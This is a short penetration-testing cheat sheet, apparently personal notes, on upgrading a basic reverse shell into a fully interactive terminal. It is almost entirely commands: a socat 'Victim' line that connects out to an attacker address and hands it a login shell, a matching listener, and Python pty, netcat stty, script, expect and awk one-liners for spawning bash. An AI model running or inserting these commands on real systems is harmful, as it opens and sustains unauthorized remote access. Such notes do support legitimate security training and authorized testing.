Upgrading from a 'dumb' shell to a fully interactive shell to prevent losing a shell from bad commands hanging or killing the connection with 'Ctrl-C'.

Other drawbacks
* Incorrect SIGINT handling
* Certain commands don't work (su, vi, nano, ssh)
* **No tab complete**
* no STDERR

# Three Methods
Reference: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
## Python
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
## socat
```
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
## netcat
```
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```

# No Python?
## Script
```
SHELL=/bin/bash script -q /dev/null
```

## expect
```
expect -c 'spawn bash; interact'
```

## awk
```
awk 'BEGIN {system("/bin/bash")}'
```
